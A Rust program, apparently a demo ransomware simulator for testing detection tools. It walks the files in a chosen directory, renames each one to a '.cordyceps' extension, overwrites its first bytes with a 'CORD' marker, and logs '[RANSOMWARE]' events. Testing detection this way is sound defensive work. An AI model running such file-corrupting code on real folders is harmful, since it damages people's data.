use std::env;
use std::fs::{self, File};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

const CORD_HEADER: &[u8] = b"CORD";
const EXT: &str = "cordyceps";

fn get_timestamp() -> String {
    use std::time::UNIX_EPOCH;
    let elapsed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis();
    let secs = elapsed / 1000;
    let millis = elapsed % 1000;
    let hours = (secs / 3600) % 24;
    let minutes = (secs / 60) % 60;
    let seconds = secs % 60;
    format!("{:02}:{:02}:{:02}.{:03}", hours, minutes, seconds, millis)
}

fn is_sandbox_path(root: &Path, path: &Path) -> bool {
    path.strip_prefix(root).is_ok()
        && fs::symlink_metadata(path).is_ok_and(|m| m.file_type().is_file())
        && path
            .canonicalize()
            .ok()
            .zip(root.canonicalize().ok())
            .is_some_and(|(path, root)| path.starts_with(root))
}

fn run_sandboxed(root: PathBuf, log_path: Option<PathBuf>) {
    let entries: Vec<PathBuf> = match fs::read_dir(&root) {
        Ok(rd) => rd
            .filter_map(|e| e.ok())
            .map(|e| e.path())
            .filter(|p| fs::symlink_metadata(p).is_ok_and(|m| m.file_type().is_file()))
            .collect(),
        _ => return,
    };
    for p in entries {
        if !is_sandbox_path(&root, &p) {
            continue;
        }
        let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
        if ext.eq_ignore_ascii_case(EXT) {
            continue;
        }
        let file_name = p
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default();

        let msg = format!(
            "[RANSOMWARE] {} | ENCRYPTING_FILE | {}\n",
            get_timestamp(),
            file_name
        );
        if let Some(ref log_p) = log_path {
            let _ = anton::demo_log::append_log_file(log_p, &msg);
        }
        println!("{}", msg.trim());

        let mut enc = p.clone();
        enc.set_extension(EXT);
        if fs::rename(&p, &enc).is_ok() {
            let renamed = enc
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();

            let msg = format!(
                "[RANSOMWARE] {} | RENAMED_WITH_EXTENSION | {}\n",
                get_timestamp(),
                renamed
            );
            if let Some(ref log_p) = log_path {
                let _ = anton::demo_log::append_log_file(log_p, &msg);
            }
            println!("{}", msg.trim());

            let _ = File::options().write(true).open(&enc).and_then(|mut f| {
                let msg = format!(
                    "[RANSOMWARE] {} | ENCRYPTED_HEADER_WRITTEN | {}\n",
                    get_timestamp(),
                    renamed
                );
                if let Some(ref log_p) = log_path {
                    let _ = anton::demo_log::append_log_file(log_p, &msg);
                }
                println!("{}", msg.trim());
                f.write_all(CORD_HEADER)
            });
        }
        std::thread::sleep(Duration::from_millis(80));
    }
}

fn main() {
    tracing_subscriber::fmt::init();
    let root = env::args().nth(1).map(PathBuf::from).unwrap_or_else(|| {
        let manifest = env!("CARGO_MANIFEST_DIR");
        Path::new(manifest).join("TestRun")
    });
    if !root.is_dir() {
        std::process::exit(1);
    }

    // Second argument is the log file path
    let log_path = env::args().nth(2).map(PathBuf::from);

    // Debug: write a marker to confirm we received the log path
    if let Some(ref log_p) = log_path {
        let _ = anton::demo_log::append_log_file(
            log_p,
            "[RANSOMWARE] Starting demo_ransomware process\n",
        );
    }

    run_sandboxed(root, log_path);
}
